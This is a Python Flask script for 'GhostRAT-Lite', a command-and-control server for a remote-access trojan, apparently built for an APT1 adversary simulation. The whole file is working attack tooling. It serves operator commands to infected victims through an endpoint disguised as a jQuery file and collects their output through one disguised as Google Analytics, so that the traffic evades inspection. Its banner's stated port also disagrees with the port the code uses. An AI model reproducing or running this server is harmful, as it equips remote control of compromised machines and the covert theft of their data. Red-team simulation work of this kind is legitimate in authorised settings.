#!/usr/bin/env python3
# GhostRAT-Lite C2 Server
# Operation GhostUnit - APT1 Simulation
# MITRE T1071.001 - Application Layer Protocol: Web Protocols

from flask import Flask, request
import datetime

app = Flask(__name__)

# Current command waiting for victim
current_command = "WAIT"
# Log file for all activity
LOG_FILE = "ghostrat_log.txt"

def log(message):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[{timestamp}] {message}"
    print(entry)
    with open(LOG_FILE, "a") as f:
        f.write(entry + "\n")

@app.route('/jquery.min.js')
def send_command():
    # Disguised as a jQuery request - APT1 WEBC2 style
    # MITRE T1071.001 - Blending C2 traffic as normal web traffic
    victim_ip = request.remote_addr
    log(f"[BEACON] Victim checked in from {victim_ip}")
    log(f"[CMD SENT] {current_command}")
    return current_command

@app.route('/analytics.js', methods=['POST'])
def receive_result():
    # Disguised as Google Analytics - evades basic traffic inspection
    result = request.data.decode()
    log(f"[RESULT RECEIVED]\n{result}")
    return "OK"

@app.route('/set/<path:cmd>')
def set_command(cmd):
    global current_command
    current_command = cmd
    log(f"[OPERATOR SET CMD] {cmd}")
    return f"Command queued: {cmd}"

@app.route('/clear')
def clear_command():
    global current_command
    current_command = "WAIT"
    log("[OPERATOR] Command cleared - victim will idle")
    return "Cleared"

if __name__ == '__main__':
    print("""
    ██████  ██   ██  ██████  ███████ ████████ ██████   █████  ████████
   ██       ██   ██ ██    ██ ██         ██    ██   ██ ██   ██    ██
   ██   ███ ███████ ██    ██ ███████    ██    ██████  ███████    ██
   ██    ██ ██   ██ ██    ██      ██    ██    ██   ██ ██   ██    ██
    ██████  ██   ██  ██████  ███████    ██    ██   ██ ██   ██    ██
    
    GhostRAT-Lite C2 Server | Operation GhostUnit
    APT1 Simulation | MITRE T1071.001
    Listening on 0.0.0.0:8080
    """)
    log("[SERVER STARTED] GhostRAT-Lite C2 online")
    app.run(host='0.0.0.0', port=5000, debug=False)
